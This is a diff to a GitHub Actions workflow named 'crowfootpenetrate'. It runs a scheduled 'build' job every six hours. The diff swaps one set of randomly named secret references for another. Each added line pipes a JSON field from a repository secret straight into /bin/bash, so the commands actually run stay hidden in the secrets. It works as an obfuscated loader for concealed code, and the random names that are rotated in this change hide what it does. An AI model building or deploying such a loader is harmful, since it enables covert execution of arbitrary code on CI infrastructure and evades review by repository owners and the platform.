@@ -1,27 +1,26 @@
 name: crowfootpenetrate
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 5/6 * * *'
+    - cron: '59 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: crowfootpenetrate
         env:
-          szrnd518: ${{ secrets.szrnd518 }}
+          zx11667: ${{ secrets.zx11667 }}
         run: |
-          echo $szrnd518 | jq -r .bpo542 | /bin/bash
-          echo $kwi41066 | jq -r .gkval837 | /bin/bash
-          echo $lkavl058 | jq -r .deb01317 | /bin/bash
-          echo $rusnu3 | jq -r .ieeim9029 | /bin/bash
-          echo $t8125 | jq -r .pfwl3 | /bin/bash
-          echo $gwc791 | jq -r .afc03 | /bin/bash
-          echo $ufvbl139 | jq -r .p657 | /bin/bash
-          echo $vv60583 | jq -r .ygqub3690 | /bin/bash
-          echo $bk5 | jq -r .gnuut30 | /bin/bash
-          echo $kemt28258 | jq -r .ud0027 | /bin/bash
-          echo $dso68 | jq -r .k5831 | /bin/bash
+          echo $zx11667 | jq -r .dsov1 | /bin/bash
+          echo $ybqh55524 | jq -r .rtc784 | /bin/bash
+          echo $vsfbj7604 | jq -r .uqvsk34707 | /bin/bash
+          echo $aboil5 | jq -r .haf80887 | /bin/bash
+          echo $g5162 | jq -r .mho79 | /bin/bash
+          echo $nbw2595 | jq -r .isxi363 | /bin/bash
+          echo $mlun837 | jq -r .v8 | /bin/bash
+          echo $mdq81 | jq -r .kv119 | /bin/bash
+          echo $yrotm35813 | jq -r .roamk2 | /bin/bash
+          echo $vys35996 | jq -r .keac33253 | /bin/bash
 
